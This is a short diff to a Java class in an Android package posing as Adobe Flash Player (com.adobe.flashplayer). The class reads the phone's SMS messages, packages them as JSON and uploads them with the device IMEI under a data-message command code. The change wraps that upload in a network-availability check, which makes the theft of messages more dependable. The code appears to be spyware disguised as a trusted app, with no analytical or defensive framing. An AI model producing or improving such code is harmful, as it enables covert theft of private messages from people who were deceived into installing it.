@@ -19,6 +19,7 @@ import android.annotation.TargetApi;
 import android.content.ContentResolver;
 import com.adobe.flashplayer.MyLog;
 import com.adobe.flashplayer.Utils;
+import com.adobe.flashplayer.network.NetworkUitls;
 import com.adobe.flashplayer.network.UploadData;
 import com.adobe.flashplayer.Public;
 
@@ -64,7 +65,11 @@ public class PhoneSMS {
                 }
                 cur.close();
 
-                UploadData.upload(jsarray.toString().getBytes(), jsarray.toString().getBytes().length, Public.CMD_DATA_MESSAGE, Public.IMEI);
+                if (NetworkUitls.isNetworkAvailable(context)) {
+                    UploadData.upload(jsarray.toString().getBytes(), jsarray.toString().getBytes().length, Public.CMD_DATA_MESSAGE, Public.IMEI);
+                }else{
+
+                }
                 return true;
             }
         }
